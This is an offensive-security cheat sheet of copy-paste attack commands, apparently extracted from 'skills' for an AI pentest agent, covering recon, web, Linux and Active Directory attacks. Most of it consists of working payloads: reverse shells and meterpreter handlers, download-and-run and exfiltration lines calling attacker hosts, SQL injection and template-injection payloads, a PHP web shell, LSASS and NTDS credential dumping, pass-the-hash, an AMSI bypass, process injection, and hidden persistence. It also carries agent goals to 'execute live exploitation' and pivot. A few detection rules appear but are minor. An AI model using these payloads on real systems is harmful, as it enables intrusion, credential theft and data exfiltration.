# KILLER QUEEN COMMAND CHEAT SHEET
> Extracted from 25 skills — 1,273 code blocks. Copy-paste ready commands organized by domain.

---


## RECON / ENUMERATION / OSINT

```bash
"domain": "enterprise-attack",
"name": "APT29 Emulation - $(date +%Y-%m-%d)",
"techniques": [
"versions": {"attack": "19", "navigator": "5.1.0", "layer": "4.5"},
- 'MiniDump'
- 'comsvcs.dll'
- attack.credential_access
- attack.t1003.001
-e DOMAIN=corp.local windows-server-core
-f exe -o /tmp/payload.exe
ATTACKER="10.99.0.100"
CommandLine|contains|all:
DC="10.99.0.10"
GROUP="APT29"
Highest CVEs: A05 (62,445) > A01 (32,654) > A02 (17,000+)
Image|endswith: '\rundll32.exe'
Priority: A03 > A02 > A05 > A01 > A07 > A04 > A10 > A06 > A08 > A09
Risk = Likelihood × Impact × Exploitability
T1003.001 LSASS Memory
T1003.003 NTDS.dit Dump
T1016 System Network Configuration Discovery
T1021.002 SMB/Windows Admin Shares
T1027.002 Software Packing
T1036.005 Match Legitimate Name or Location
T1040 Network Sniffing
T1041 Exfiltration Over C2 Channel
T1053.005 Scheduled Task
T1055.001 Process Injection: DLL Injection
T1055.012 Process Hollowing
T1059.001 PowerShell
T1082 System Information Discovery
T1105 Ingress Tool Transfer
T1190 Exploit Public-Facing Application
T1204.002 Malicious File
T1218.011 Rundll32
T1485 Data Destruction
T1486 Data Encrypted for Impact
T1547.001 Registry Run Keys / Startup Folder
T1548.002 Bypass UAC
T1558.004 AS-REP Roasting
T1562.001 Disable or Modify Tools
T1566.001 Spearphishing Attachment
T1574.002 DLL Side-Loading
TARGET="10.99.0.20"
TECHNIQUES="T1195.002 T1566.001 T1078 T1059.001 T1003.001 T1021.002 T1041 T1071.001 T1573"
cat > /tmp/apt29_emulation.json << 'LAYER'
cat > /tmp/sigma_lsass_dump.yml << 'EOF'
category: process_creation
cewl -d 2 -m 5 -w /tmp/cewl_words.txt https://target.com/
condition: selection
context: "Findings from: <list of agent output files>. Run full §10.2 chain-synthesis protocol. Pair-wise compose, multi-hop expand, score, promote viable chains."
context: "Repo path: <path>. Run semgrep, bandit/gosec, manual sink hunting. Output vulnerability_inventory.json with CWE, severity, file:line, gadget classification."
context: "Target: <AWS account/credentials>. Enumerate current permissions, map all escalation paths, test persistence, check detection evasion."
context: "Target: <device/firmware path>. Use binwalk, strings, grep for passwords/keys, check for UART/JTAG references, test diagnostic endpoints, map protocols."
context: "Target: <target>. Confirmed findings: <list>. Execute PoC, capture evidence, pivot. Per agent.md §7.4."
context: "Target: <target>. Use amass, subfinder, crt.sh, nmap -p- -sV -sC, nuclei, whatweb. Output to /tmp/recon_<target>.json"
context: "Target: <url>. Run full WSTG methodology. Test every input, every API, every auth boundary. Flag every finding as primitive/amplifier per chain protocol."
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
curl -sk https://target.com/wp-json/ | jq '.namespaces'
curl -sk https://target.com/wp-json/NAMESPACE/v1 | jq '.routes | keys'
description: Detects LSASS memory dumping via comsvcs.dll MiniDump export
detection:
dnscat2-client --dns server=$ATTACKER --secret s3cretp@ss
dnscat2-server --dns domain=c2.evildomain.com --secret s3cretp@ss
docker network create apt29-lab --subnet=10.99.0.0/24
docker run -d --name dc --network apt29-lab --ip 10.99.0.10 \
docker run -d --name win10 --network apt29-lab --ip 10.99.0.20 \
echo "1. Map findings to ATT&CK technique IDs"
echo "2. Map findings to OWASP categories"
echo "3. Provide remediation per OWASP + ATT&CK mitigation guidance"
echo "4. Include TTP map for APT emulation attribution"
echo "=== APT Emulation Complete ==="
echo "Layer saved. Import at: https://mitre-attack.github.io/attack-navigator/"
evil-winrm -i $DC -u Administrator -H <NTHASH>
goal: "Analyze <firmware/device> for vulnerabilities. Extract filesystem, find hardcoded credentials, check debug interfaces, test for command injection, map attack surface."
goal: "Audit <repo> for vulnerabilities. Run all SAST tools, manual grep for sinks, CVE-reachability on deps. Classify every finding. Generate PoC for high/critical."
goal: "Enumerate IAM permissions on <target>, identify privilege escalation paths, test persistence techniques, check GuardDuty configuration."
goal: "Execute live exploitation against <target> for confirmed findings and chains. Capture blast radius, forensic evidence. Pivot to new targets."
goal: "Run full reconnaissance on <target>. Passive then active. Map all subdomains, open ports, services, technologies. Output structured JSON."
goal: "Synthesize all findings from the engagement into exploit chains. Compose primitives + amplifiers. Score every chain. Output viable chains to exploit."
goal: "Test <target> for all OWASP Top 10 + WSTG categories. Run nuclei, fuzz parameters, test auth, test IDOR, test SSRF, test all injection points. Output structured findings."
id: 4a1b6da0-d837-4e7e-a0e5-abc543210f0d
impacket-psexec -hashes :<NTHASH> Administrator@$DC
impacket-smbexec -hashes :<NTHASH> Administrator@$DC
impacket-wmiexec -hashes :<NTHASH> Administrator@$DC
level: high
logsource:
meterpreter> arp_scanner -r 10.99.0.0/24
meterpreter> creds_all
meterpreter> download C:\\Windows\\Temp\\exfil.zip /tmp/exfil.zip
meterpreter> getuid
meterpreter> kerberos_ticket_use /tmp/kirbi_ticket
meterpreter> kiwi_cmd lsadump::lsa /inject
meterpreter> load kiwi
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
meterpreter> run post/windows/gather/enum_ad_users
meterpreter> run post/windows/gather/enum_domain
meterpreter> run post/windows/gather/enum_network
meterpreter> run post/windows/gather/enum_system
meterpreter> run post/windows/manage/psexec_psh RHOST=$DC SMBUser=Administrator SMBPass=<hash>
meterpreter> sysinfo
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; \
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ATTACKER LPORT=443 \
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <b64>
powershell.exe -NoProfile -NonInteractive -Command "IEX (New-Object Net.WebClient).DownloadString('http://$ATTACKER/script.ps1')"
powershell> Compress-Archive -Path C:\data -DestinationPath C:\Windows\Temp\exfil.zip
powershell> Get-NetComputer | select name,operatingsystem
powershell> Get-NetGroup "Domain Admins" | select member
powershell> Get-NetUser | select samaccountname,memberof
powershell> Invoke-WebRequest -Uri https://$ATTACKER/upload -Method POST -InFile C:\Windows\Temp\exfil.zip
powershell> ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntdsdump" q q
powershell> rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
product: windows
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\updater.ps1" /sc daily /st 09:00 /ru SYSTEM
selection:
set LHOST $ATTACKER; set LPORT 443; exploit -j"
skills: ["cloud-iam-attacks", "infrastructure-attacks"]
skills: ["embedded-iot-attacks", "exploit-development"]
skills: ["exploit-development", "web-attacks", "cve-intelligence"]
skills: ["exploit-development", "web-attacks", "infrastructure-attacks"]
skills: ["kali-tools-arsenal", "infrastructure-attacks"]
skills: ["web-attacks", "exploit-development", "threat-intel"]
skills: ["web-attacks", "testing-methodology"]
sliver-client
sliver-server &
title: LSASS Memory Dump via MiniDump
toolsets: ["terminal", "file", "web"]
toolsets: ["terminal", "file"]
toolsets: ["terminal", "web", "browser"]
toolsets: ["terminal", "web"]
vssadmin create shadow /for=C:
vssadmin delete shadows /for=C: /all
windows-10-enterprise
wmic /node:$TARGET process call create "powershell.exe -EncodedCommand <b64>"
xfreerdp /v:$TARGET /u:Administrator /pth:<NTHASH> +compression +clipboard /dynamic-resolution /drive:share,/tmp
{"techniqueID": "T1003.001", "score": 80, "comment": "LSASS dump — detection gap: no Sysmon 10"},
{"techniqueID": "T1021.002", "score": 100, "comment": "SMB lateral movement with PTH"},
{"techniqueID": "T1041", "score": 100, "comment": "Exfiltration over HTTPS C2 channel"},
{"techniqueID": "T1059.001", "score": 100, "comment": "PowerShell execution chain"},
{"techniqueID": "T1071.001", "score": 100, "comment": "C2 over HTTPS (beaconing)"}
{"techniqueID": "T1078", "score": 100, "comment": "Valid accounts used for lateral movement"},
{"techniqueID": "T1195.002", "score": 100, "comment": "Simulated supply chain — SolarWinds-like"},
{"techniqueID": "T1566.001", "score": 100, "comment": "Spearphishing attachment executed"},
```

## WEB APPLICATION ATTACKS

```bash
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval ["__import__('os').system('id')"]]]
" // end original string
" <script> ".trim() // Whitespace stripping
" autofocus onfocus=alert(1) x="
" onanimationend=alert(1)
" onanimationstart=alert(1)
" onclick="alert(1) # Event handler in attribute
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x
" onmouseover=alert(1)
" onpointerdown=alert(1)
" onpointerenter=alert(1)
" onpointerleave=alert(1)
" onpointerover=alert(1)
"<img src=x onerror=alert(document.domain)>", "*"
"<img src=x>".substr(0,4) // Substring extraction
"></script><script src=http://LHOST/xss.js></script>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
"GET:/health" 1;
"GET:/v1/models" 1;
"PAYLOAD".split("").join("") // Split+join = identity (bypass)
"POST:/v1/chat/completions" 1;
"POST:/v1/completions" 1;
"SCRIPT".toLowerCase() // Case normalization
"TARGET/wp-admin/admin-post.php" -d "action=$action")
"alert(1)".replace(/a/g, "\\u0061") // Unicode escape substitution
"alg": "RS256",
"http://TARGET:9090/api/v2/models/install",
"https-post-form://target.com/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F:F=login_error" \
"inplace": "true",
"inputs": {
"jku": "http://LHOST/jwks.json",
"kid": "attacker-key"
"litespeed-cache/v1" "litespeed/v1" "custom-fonts/v1" "bsf-custom-fonts/v1"; do
"loadMethod": "listActions"
"loadMethod": "listActions",
"mcpServerConfig": "({trigger:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"sh -c \\\"id>/tmp/pwn\\\"\");return 1;})()})"
"mcpServerConfig": {"command": "touch", "args": ["/tmp/pwned"]}
"slug ليس واحدًا من angie، manage، elementor، elementor-pro، site-mailer، image-optimization، pojo-accessibility، و cookiez."
"source": "http://ATTACKER/payload.ckpt",
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
$'\x2fbin\x2fcat' /etc/passwd
$( sleep 5 )
$("#target").html(userInput) // jQuery XSS sink
$(echo L2V0Yy9wYXNzd2Q= | base64 -d) # Base64 decode to /etc/passwd → then run
$(id) Dollar substitution
$(tr '!-}' '.- '<<<"]' ) # ROT-like character shifts
$.extend(true, target, source) // jQuery deep extend
$cookie = $_GET['c'];
$formId = (int) $this->request->get('form_id');
$fp = fopen('cookies.txt', 'a+');
$out.read()
$response = (new SubmissionHandlerService())->handleSubmission($data, $formId);
$runtime.exec("id")
${ ... } Freemarker / Mako / Velocity
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
${7*7} # Freemarker: 49
${7*7} Freemarker: 49
${T(java.lang.Runtime).getRuntime().exec('calc')}
${\"freemarker.template.utility.Execute\"?new()(\"id\")}
${alert(1)} # Template literal sink
${dwf.newInstance(ec,null)("id")}
${{<%[%'"}}%\.
%%2727 %25%27 Double URL-encoded
%09/evil.com # Tab character
%0A id Newline injection
%0D%0A id CRLF
%0a sleep 5
%0d%0a # CRLF
%0d%0a whoami
%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a<html>crlf-injection</html>
%0d%0aSet-Cookie:crlf=injected
%252e%252e%252fetc%252fpasswd
%27 %22 %23 %3B %29 Single URL-encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2fetc%2fpasswd
%2f%2fevil.com # URL-encoded //
%53%45%4C%45%43%54 Hex encoding
%CA%BA %CA%B9 Unicode (MODIFIER LETTER PRIME → ')
%E5%98%8A%E5%98%8D # Unicode CRLF (UTF-8 overlong for \r\n)
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%eval;
%exfil;
%local_dtd;
%pe_4;
%u4E0A → newline equivalent, bypasses regex
%uff0e%uff0e%u2215etc%u2215passwd
%xxe;
& whoami /a Windows background
&#x25;error;
&#x25;eval;
&& id AND (if first succeeds)
&& sleep 5
' " ; ) * Simple characters
' AND (SELECT * FROM (SELECT count(*),concat((SELECT database()),floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE char(0) END)=0 WAITFOR DELAY '0:0:5'--
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)=1--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0))--
' AND (SELECT LENGTH(database()))=5--
' AND (SELECT SUBSTRING(current_database(),1,1))='a'--
' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('x',5)-- # Oracle
' AND 1=1-- # True
' AND 1=1-- ' AND 1=2-- # Confirm injection
' AND 1=2-- # False
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE rownum=1))-- # Oracle
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- # Binary search
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),0)--
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
' AND MID(database() FROM 1 FOR 1)='a'--
' AND SLEEP(5)--
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- # Char extraction
' AND SUBSTRING(database() FROM 1 FOR 1)='a'--
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- # MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
' IF (SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--
' OR '1'='1'#
' OR '1'='1'--
' OR '1'='1'/*
' OR 'a' IN ('a')--
' OR 'hello' > 'a'--
' OR 1 BETWEEN 1 AND 1--
' OR 1 LIKE 1--
' OR 1=1 ORDER BY 1--
' OR 1=CAST((SELECT current_database()) AS int)--
' OR 1=CAST((SELECT version()) AS int)--
' OR 1>0--
' OR SLEEP(5)-- # MySQL
' OR dblink_connect('host=attacker.com user=a password=a dbname='||current_database())-- # PostgreSQL
' OR pg_sleep(5)-- # PostgreSQL
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' UNION SELECT 1 OFFSET 1 ROW FETCH NEXT 1 ROWS ONLY-- # MSSQL
' UNION SELECT 1,'<?php system($_GET["c"]);?>',3 INTO OUTFILE '/var/www/shell.php'--
' UNION SELECT 1,2,3,4-- # Find visible cols
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3-- # Column count
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,@@version,3-- # MySQL version
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,concat(username,0x3a,password),3 FROM users--
```

## INFRASTRUCTURE / LINUX PRIVESC

```bash
!-1!-2 # After failed whoa + mi commands
"https-post-form://TARGET_IP:2083/login/:user=^USER^&pass=^PASS^&login_only=1:F=invalid_login" \
"https-post-form://cpanel.target.com:2083/login/:user=^USER^&pass=^PASS^&login_only=1:F=invalid_login" \
"https-post-form://target.com/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=login_error" \
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi"); $(a="WhOaMi";printf %s "${a,,}")
$UserPassword = ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force
'p'i'n'g; "w"h"o"a"m"i
(echo "EHLO test"; echo "AUTH PLAIN $(cat)"; echo "QUIT") | \
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > spaced_key.txt
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'")
(sh)0>/dev/tcp/10.10.10.10/443
- Dumpster diving for domain-naming schemas, usernames on printed docs
- Email addresses: hunter.io, phonebook.cz, CrossLinked for name format guessing
- Enterprise (802.1X): capture EAP handshakes, crack MSCHAPv2 (asleap), evil twin + RADIUS
- GEOINT: physical office location from Google Maps → WiFi/wireless attack planning
- HID injection: Rubber Ducky, Bash Bunny for keystroke injection
- Keylogging: hardware USB keyloggers on unattended workstations
- NAC (Network Access Control): 802.1X enforcement
- OSINT: LinkedIn for employee names → construct usernames
- Pastebin/GitHub: search for domain name, internal hostnames, config leaks
- RFID cloning: Proxmark3 for HID/Indala badge cloning
- WEP: aircrack-ng capture + crack (minutes)
- WPA2 PSK: airodump-ng capture handshake → hashcat -m 22000
- WPS: reaver/pixiewps for PIN brute force
- Web infrastructure: Shodan, Censys, FOFA for exposed AD services
--data-length 200 # Append random data to packets
--host-timeout <time> # Give up after this long
--max-rate <number> # Max packets per second
--max-retries <tries> # Port scan retransmissions
--min-hostgroup / --max-hostgroup <size> # Parallel host groups
--min-parallelism / --max-parallelism <numprobes>
--min-rate <number> # Min packets per second
--min-rtt-timeout / --max-rtt-timeout / --initial-rtt-timeout <time>
--mtu 32 # Custom fragment offset
--open # Only show open ports
--packet-trace # Show all packets sent/received
--proxies http://proxy1:8080,... # HTTP/SOCKS4 proxy relay
--reason # Show why port state was determined
--resume results.nmap # Resume aborted scan
--scan-delay / --max-scan-delay <time> # Delay between probes
--script "not intrusive" # Exclude intrusive
--script-args snmpcommunity=admin # Script arguments
--script=banner # Single script
--script=http* # Wildcard (all HTTP scripts)
--source-port 53 # Source port spoofing
-D decoy1,decoy2,ME,decoy3 # Decoy scan (mix with your real IP)
-F "file=@shell.php" -F "dir=/home/username/public_html/"
-H "Authorization: Basic $AUTH" \
-H "Cookie: whostmgrsession=$SESSION"
-S <spoofed_ip> # Spoof source IP
-d "command=id"
-d "user=nobody&pass=nobody" | grep whostmgrsession
-f # Fragment packets (8-byte fragments)
-g <port> # Spoof source port (e.g., 53 for DNS)
-oA results # All three formats
-oG results.gnmap # Grepable output
-oN results.nmap # Normal output
-oX results.xml # XML output
-sC / --script default # Safe default scripts
-t 1 -w 8 -o cpanel_ip_results.txt
-t 1 -w 8 -o cpanel_results.txt
-t 8 -w 3 -o wp_results.txt
./config --prefix=/opt/openssl --openssldir=/opt/openssl && make && sudo make install
./crosslinked.py -f '{first}.{last}' 'Target Corp' --format csv
/usr/bin/p?ng; /usr/bin/who*mi; /usr/bin/n[c]
ADSearch # LDAP search utility
AES128-CTS = PBKDF2(password, salt, 4096) → 128-bit
AES256-CTS = PBKDF2(password, salt, 4096) → 256-bit
AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (ST) → AP-REQ
AUTH=$(echo -ne "$PAYLOAD" | base64 -w0)
Add-DomainObjectAcl -TargetIdentity targetUser -PrincipalIdentity attackerUser -Rights ResetPassword
Computer account: DOMAIN.LOCALhostcomputername.domain.local (lowercase computer name)
DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
EXPN root; EXPN sshd
Find-InterestingDomainAcl -ResolveGUIDs
GenericAll / WriteDacl / WriteOwner: object-type 00000000-0000-0000-0000-000000000000 (entire object)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|WriteDacl|WriteOwner|Self"}
GetNPUsers.py # AS-REP roasting
GetUserSPNs.py # Kerberoasting
HELO test; VRFY root; VRFY admin
HGET <KEY> <FIELD> # hash fields
Hostname format: vmiNNNNNNN.contaboserver.net
IFS=];b=cat]/etc/passwd;$b
INFO keyspace; SELECT 0; KEYS *; GET <KEY>
LRANGE <KEY> 0 -1 # list items
LdapRelayScan # Check for LDAP signing/channel binding
MAIL FROM:test@test.com; RCPT TO:admin; RCPT TO:root
PAYLOAD="user=root\nhasroot=1\ntfa_verified=1\nsuccessful_internal_auth_with_timestamp=9999999999"
PKINITtools # Shadow Credentials + UnPAC-the-hash
PowerView.ps1 # PowerShell AD enumeration
Powermad.ps1 # AD machine account creation + SPN abuse
RC4-HMAC = NT hash of the principal (no salt)
Rate limiting is aggressive — 4-5 req/min before IP block
Rubeus.exe # .NET Kerberos abuse (asktgt, s4u, kerberoast, asreproast)
SSH default: publickey-only — password auth typically disabled
Self-Membership: bf9679c0-0de6-11d0-a285-00aa003049e2
Set-DomainUserPassword -Identity targetUser -AccountPassword $UserPassword
SharpHound.exe -c All --ZipFilename data.zip
SharpHound.exe -c All,LoggedOn,Sessions --ZipFilename data.zip --Stealth
SharpHound.exe -c DcOnly --ZipFilename comp_data.zip # Domain controller-only data
StandIn.exe # .NET AD object manipulation
StandIn.py # Python port of StandIn
TYPE <KEY> # string, list, hash, set
Use web_extract as out-of-band channel when terminal IP is blocked
User account: DOMAIN.LOCALuser
User-Force-Change-Password: 00299570-246d-11d0-a768-00aa006e0529
Validated-SPN: f3a64788-5306-11d1-a9c5-0000f80367c1
WordPress often installed via cPanel's WP Toolkit
\u\n\a\m\e \-\a; /\b\i\n/////s\h
addcomputer.py # Create machine account (if quota allows)
ausearch -m AVC,USER_AVC -ts recent | audit2allow -M localfix
auth=$(echo -ne "\\0${USER}\\0${password}" | base64 -w0)
avml memory.lime # LiME format
aws ec2 describe-instances; aws ec2 describe-security-groups
aws iam list-users; aws iam list-roles; aws iam list-policies
aws s3 cp s3://bucket-name/flag.txt - --no-sign-request
aws s3 ls s3://bucket-name --no-sign-request
az login --identity; az account show
az vm list; az keyvault secret list --vault-name <name>
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
binwalk -e image.dd # extract embedded files
bloodyAD.py # Full AD object manipulation
bulk_extractor -o output/ image.dd
capsh --print; getpcaps $$
cat /etc/crontab; ls -la /etc/cron.*; crontab -l -u root 2>/dev/null
cat /proc/1/cgroup | grep -i docker
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat spaced_key.txt | redis-cli -h TARGET -x set ssh_key
cat ~/.kube/config; cat /etc/kubernetes/admin.conf 2>/dev/null
cat$u /etc$u/passwd$u; p${u}i${u}n${u}g
cdk # Container penetration toolkit
certipy # AD CS abuse (ESC1-13)
chmod +x /release_agent.sh
coercer # Multi-vector NTLM coercion framework
cpcalendars/cpcontacts → typically 401 when hit directly
crowbar -b rdp -s TARGET/32 -U users.txt -c 'password123'
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/
curl -sk "https://TARGET:2087/cpsessXXX/execute/Command/run" \
curl -sk "https://TARGET:2087/cpsessXXX/execute/Fileman/upload" \
curl -sk "https://TARGET:2087/cpsessXXX/json-api/listaccts?api.version=1"
curl -sk "https://TARGET:2087/cpsessXXXXXXXXXX/json-api/version"
curl -sk "https://TARGET:2087/cpsessXXXXXXXXXX/scripts2/do_token_denied"
```

## ACTIVE DIRECTORY / WINDOWS

```bash
"@ -Name "Win32" -namespace Win32Functions -passthru
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://IP/payload.ps1'))"
$binding = Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), "target")
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "target"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
$dcom.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
$h = [PSObject].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdb = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($sdb, 0)
$sid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
$trigger = New-ScheduledTaskTrigger -Daily -At 3am
$w = Add-Type -memberDefinition @"
((void(*)())pMem)();
(LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-...'
-domain 'lab.local' -user 'lowpriv' -password 'Pass!' \
./chisel client server:8080 R:3000:127.0.0.1:3000
./chisel server -p 8080 --reverse
.\Rubeus.exe hash /password:P@ss123 /user:FAKE01$ /domain:domain.local
.\Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /ptt
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /opsec /nowrap
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticket:<BASE64_TGT> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ticketuser:target /ticketuserid:1111 \
3/68 — Custom x64 injection binary
32/66 — Minor VirtualAlloc size adjustments
36/68 — Recompiled template (no code changes, new compiler artifacts)
48/68 — Default msfvenom x86 template
8/68 — Custom x86 injection binary (manual VirtualAlloc + RtlMoveMemory)
:: All users
:: Also check these additional locations:
:: Alternative: use PID to avoid string-based AV detection
:: Both must be 0x1
:: Check if enabled
:: Check permissions with accesschk
:: Check write permissions
:: Create and run MSI payload
:: Create hidden SYSTEM task
:: Create new service
:: Current user
:: Dump LSASS
:: Extract credentials offline
:: Extract offline
:: Find unquoted paths
:: If SERVICE_ALL_ACCESS → modify and start
:: If writable: modify ImagePath
:: Machine-level (requires admin)
:: Modify existing disabled service
:: No upload needed — DLL already in System32
:: PowerShell variant with hidden window
:: Registry save (requires admin)
:: User-level
CommandLineTemplate="powershell.exe -ep bypass -c IEX(...)"
Consumer=$consumer
CreateProcessA("C:\\Windows\\System32\\cmd.exe", cmdline, NULL, NULL, FALSE,
CreateProcessA(targetExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
CreateRemoteThread(hProcess, NULL, NULL,
DWORD oldProtect;
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
Enter-PSSession -ComputerName target -Credential (Get-Credential)
EventNamespace="root\cimv2"
FARPROC pTarget = GetProcAddress(GetModuleHandle("ntdll"), "NtReadVirtualMemory");
Filter=$filter
Find-PathDLLHijack
Find-ProcessDLLHijack
GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
Get-DomainComputer VICTIM | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdb}
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt
GetNPUsers.py domain/ -usersfile users.txt -outputfile asrep.txt
GetUserSPNs.py -dc-ip dc_ip -request domain/user:pass
GetUserSPNs.py -dc-ip dc_ip -request domain/user:pass -outputfile spns.txt
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -ep bypass -c ..."
LPVOID offset = 0;
